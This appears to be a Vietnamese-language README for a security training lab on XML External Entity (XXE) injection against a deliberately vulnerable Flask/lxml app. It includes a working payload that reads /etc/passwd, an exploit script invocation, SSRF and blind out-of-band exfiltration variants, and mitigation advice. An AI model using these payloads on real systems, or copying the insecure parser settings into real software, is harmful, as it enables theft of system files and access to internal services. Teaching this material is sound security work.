# Lab 8.3 - XXE (XML External Entity)

API Flask nhan lien he dang XML, parse bang lxml voi parser bat `resolve_entities=True, load_dtd=True, no_network=False`. Loi: cho phep external entity, ke tan cong khai bao entity tro toi file he thong va doc duoc noi dung.

## Dung

```bash
python3 app.py
# 127.0.0.1:8066
```

Yeu cau: Python 3, Flask, lxml.

## Khai thac

```bash
bash exploit.sh
# drvfs bao "Invalid argument": cat exploit.sh | bash
```

Luu y: phai gui Content-Type `application/xml` (hoac text/xml), neu gui mac dinh `x-www-form-urlencoded` thi Flask nuot body vao form va `request.data` rong.

Payload chinh:

```xml
<?xml version="1.0"?>
<!DOCTYPE contact [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<contact><name>&xxe;</name><msg>test</msg></contact>
```

Server tra ve `name` = noi dung `/etc/passwd`.

## Ket qua mong doi

Doc duoc toan bo `/etc/passwd` va `/etc/hostname`. Xem `transcript.txt`.

## Mo rong (xem bai hoc)

- SSRF: `<!ENTITY x SYSTEM "http://169.254.169.254/...">` -> server tu goi URL.
- Blind OOB: parameter entity + DTD ngoai de ro ri du lieu ra server cua ke tan cong khi response khong phan hoi truc tiep.

## Phong

- Tat DTD va external entity. Voi lxml: `etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)` va nen `forbid_dtd`/`defusedxml`.
- Python: dung thu vien `defusedxml` thay cho parser mac dinh.
- Chan ca `file://`, `http://`, `php://`, `expect://` qua cau hinh parser; khong dua XML tu nguoi dung vao parser mac dinh cua libxml2 cu.
